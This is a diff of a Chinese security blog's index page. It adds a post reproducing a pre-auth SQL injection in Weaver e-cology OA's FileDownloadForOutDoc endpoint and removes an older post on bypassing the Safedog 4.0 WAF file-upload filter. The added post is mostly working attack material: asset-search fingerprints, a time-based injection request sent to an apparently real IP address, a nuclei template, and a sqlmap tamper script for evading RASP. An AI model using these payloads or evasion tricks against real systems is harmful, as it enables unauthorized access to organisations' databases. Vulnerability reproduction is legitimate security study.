@@ -255,6 +255,97 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-cn">
+    <link itemprop="mainEntityOfPage" href="https://wanheiqiyihu.top/2023/08/09/%E3%80%90%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E3%80%91%E6%B3%9B%E5%BE%AE-e-cology-FileDownloadForOutDoc%E5%89%8D%E5%8F%B0SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="十三">
+      <meta itemprop="description" content="潜心学习，不骄不躁">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="十三の博客">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2023/08/09/%E3%80%90%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E3%80%91%E6%B3%9B%E5%BE%AE-e-cology-FileDownloadForOutDoc%E5%89%8D%E5%8F%B0SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" class="post-title-link" itemprop="url">【漏洞复现】泛微 e-cology-FileDownloadForOutDoc前台SQL注入漏洞复现</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2023-08-09 19:14:27 / 修改时间：19:15:02" itemprop="dateCreated datePublished" datetime="2023-08-09T19:14:27+08:00">2023-08-09</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/fuxian/" itemprop="url" rel="index"><span itemprop="name">-fuxian</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="【漏洞复现】泛微-e-cology-FileDownloadForOutDoc前台SQL注入漏洞复现"><a href="#【漏洞复现】泛微-e-cology-FileDownloadForOutDoc前台SQL注入漏洞复现" class="headerlink" title="【漏洞复现】泛微 e-cology-FileDownloadForOutDoc前台SQL注入漏洞复现"></a>【漏洞复现】泛微 e-cology-FileDownloadForOutDoc前台SQL注入漏洞复现</h1><p>最近hw也是曝出好多好多漏洞啊，看的考研人直发痒啊啊啊。0day咱拿不到还不能玩点高频漏洞吗。所以这里收集了30几个23年的常用漏洞，来挨个复现一下哈。没事就复现一下。目前笔者也是在学c语言准备考研了，考完之后的话可能大概会继续专研技术，主要分两个方向吧，恶意软件编写和分析和web安全方面的，当然一切都还没有定数。（万一去玩web3的也说不定呢）祝笔者今年顺利考上研究生。</p>
+<h1 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Ecology 9.x 补丁版本 &lt; 10.58.0</span><br><span class="line"></span><br><span class="line">Ecology 8.x 补丁版本 &lt; 10.58.0</span><br></pre></td></tr></table></figure>
+
+<h1 id="语法特征"><a href="#语法特征" class="headerlink" title="语法特征"></a>语法特征</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">app.name=&quot;泛微 e-cology 9.0 OA&quot;</span><br><span class="line"></span><br><span class="line">app.name=&quot;泛微 e-cology OA&quot;</span><br><span class="line"></span><br><span class="line">app=&quot;泛微-协同商务系统&quot;</span><br></pre></td></tr></table></figure>
+
+<h1 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">POST /weaver/weaver.file.FileDownloadForOutDoc HTTP/1.1</span><br><span class="line">Host: 101.230.160.27:8885</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">If-None-Match: &quot;AyurgkJJwkD&quot;</span><br><span class="line">If-Modified-Since: Sat, 15 Oct 2022 01:55:58 GMT</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 47</span><br><span class="line"></span><br><span class="line">fileid=512+WAITFOR+DELAY+&#x27;0:0:8&#x27;&amp;isFromOutImg=1</span><br></pre></td></tr></table></figure>
+
+<p>由于泛微OA启用了RASP，同一个请求执行两次会被拦截，所以需要在请求包中添加随机参数；下面是RASP的介绍</p>
+<p>RASP是Runtime Application Self-Protection（运行时应用自我保护）的缩写，是一种用于保护应用程序免受攻击的安全技术。它是在应用程序运行时进行安全检测和保护的一种方法，可以在应用程序本身内部或与应用程序紧密集成的组件中实现。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">POST /weaver/weaver.file.FileDownloadForOutDoc HTTP/1.1</span><br><span class="line">Host: ip:port</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.93 Safari/537.36</span><br><span class="line">Content-Length: 45</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">fileid=&#123;random&#125;+WAITFOR+DELAY+&#x27;0:0:5&#x27;&amp;isFromOutImg=1</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+
+
+<p>nuclei poc如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">id: ecology-oa-filedownloadforoutdoc-sqli</span><br><span class="line"></span><br><span class="line">info:</span><br><span class="line">  name: EcologyOA filedownloadforoutdoc - SQL injection</span><br><span class="line">  author: unknown</span><br><span class="line">  severity: critical</span><br><span class="line">  description: EcologyOA filedownloadforoutdoc interface has SQL injection</span><br><span class="line">  tags: ecology-oa,sqli</span><br><span class="line"></span><br><span class="line">requests:</span><br><span class="line">  - raw:</span><br><span class="line">      - |</span><br><span class="line">        POST /weaver/weaver.file.FileDownloadForOutDoc HTTP/1.1</span><br><span class="line">        Host: &#123;&#123;Hostname&#125;&#125;</span><br><span class="line">        Accept: */*</span><br><span class="line">        Accept-Encoding: gzip, deflate</span><br><span class="line">        Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">        Connection: close        </span><br><span class="line"></span><br><span class="line">        fileid=2+WAITFOR DELAY+&#x27;0:0:5&#x27;&amp;isFromOutImg=1</span><br><span class="line">    matchers:</span><br><span class="line">      - type: dsl</span><br><span class="line">        dsl:</span><br><span class="line">          - &#x27;duration&gt;=5&#x27;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h1 id="tamper脚本"><a href="#tamper脚本" class="headerlink" title="tamper脚本"></a>tamper脚本</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">import random</span><br><span class="line">from lib.core.enums import PRIORITY</span><br><span class="line"></span><br><span class="line">__priority__ = PRIORITY.HIGH</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def tamper(payload, **kwargs):</span><br><span class="line">  res = &quot;&quot;</span><br><span class="line">  ran = random.randint(1,2**20)</span><br><span class="line">  res = str(ran)+payload</span><br><span class="line">  return res</span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-cn">
     <link itemprop="mainEntityOfPage" href="https://wanheiqiyihu.top/2023/07/27/%E7%BA%A2%E9%98%9F%E9%9A%90%E8%94%BD-whonix-vmware/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -450,92 +541,6 @@
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-cn">
-    <link itemprop="mainEntityOfPage" href="https://wanheiqiyihu.top/2023/07/13/%E3%80%90%E7%BB%95%E8%BF%87%E3%80%91%E5%AE%89%E5%85%A8%E7%8B%974-0%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="十三">
-      <meta itemprop="description" content="潜心学习，不骄不躁">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="十三の博客">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2023/07/13/%E3%80%90%E7%BB%95%E8%BF%87%E3%80%91%E5%AE%89%E5%85%A8%E7%8B%974-0%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87/" class="post-title-link" itemprop="url">【绕过】安全狗4.0文件上传绕过</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-              
-
-              <time title="创建时间：2023-07-13 20:20:57 / 修改时间：20:21:40" itemprop="dateCreated datePublished" datetime="2023-07-13T20:20:57+08:00">2023-07-13</time>
-            </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/penetration/" itemprop="url" rel="index"><span itemprop="name">-penetration</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h1 id="【绕过】安全狗4-0文件上传绕过"><a href="#【绕过】安全狗4-0文件上传绕过" class="headerlink" title="【绕过】安全狗4.0文件上传绕过"></a>【绕过】安全狗4.0文件上传绕过</h1><h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>这个是演示代码，直接放在phpstudy上面就可以了</p>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;upload_file.php&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span></span></span><br><span class="line"><span class="tag"><span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;file&quot;</span>&gt;</span>Filename:<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Submit&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>upload_file.php</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;error&quot;</span>] &gt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Error: &quot;</span> . <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;error&quot;</span>] . <span class="string">&quot;&lt;br /&gt;&quot;</span>;</span><br><span class="line">&#125; <span class="comment">//开源软件:phpfensi.com</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Upload: &quot;</span> . <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>] . <span class="string">&quot;&lt;br /&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Type: &quot;</span> . <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;type&quot;</span>] . <span class="string">&quot;&lt;br /&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Size: &quot;</span> . (<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;size&quot;</span>] / <span class="number">1024</span>) . <span class="string">&quot; Kb&lt;br /&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Stored in: &quot;</span> . <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>下载安全狗4.0</p>
-<p><a target="_blank" rel="noopener" href="http://down.safedog.cn/download/software/safedogwzApache.exe">http://down.safedog.cn/download/software/safedogwzApache.exe</a></p>
-<p><img src="/2023/07/13/%E3%80%90%E7%BB%95%E8%BF%87%E3%80%91%E5%AE%89%E5%85%A8%E7%8B%974-0%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87/image-20230713200343946.png" alt="image-20230713200343946"></p>
-<p>apache需要注册为服务可执行命令完成此操作。</p>
-<p><img src="/2023/07/13/%E3%80%90%E7%BB%95%E8%BF%87%E3%80%91%E5%AE%89%E5%85%A8%E7%8B%974-0%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87/image-20230713200810998.png" alt="image-20230713200810998"></p>
-<p>之后安装相应插件，并且开启服务。</p>
-<h1 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h1><p>正常上传，被拦截</p>
-<p><img src="/2023/07/13/%E3%80%90%E7%BB%95%E8%BF%87%E3%80%91%E5%AE%89%E5%85%A8%E7%8B%974-0%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87/image-20230713201821622.png" alt="image-20230713201821622"></p>
-<p>后缀使用%00拦截并url编码绕过</p>
-<p><img src="/2023/07/13/%E3%80%90%E7%BB%95%E8%BF%87%E3%80%91%E5%AE%89%E5%85%A8%E7%8B%974-0%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87/image-20230713201906829.png" alt="image-20230713201906829"></p>
-<p><img src="/2023/07/13/%E3%80%90%E7%BB%95%E8%BF%87%E3%80%91%E5%AE%89%E5%85%A8%E7%8B%974-0%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87/image-20230713201914581.png" alt="image-20230713201914581"></p>
-<p><img src="/2023/07/13/%E3%80%90%E7%BB%95%E8%BF%87%E3%80%91%E5%AE%89%E5%85%A8%E7%8B%974-0%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87/image-20230713201946519.png" alt="image-20230713201946519"></p>
-<p>成功绕过（这个东西是网站的白名单，但是安全狗确实是被绕过了的）</p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
@@ -607,7 +612,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">175</span>
+          <span class="site-state-item-count">176</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
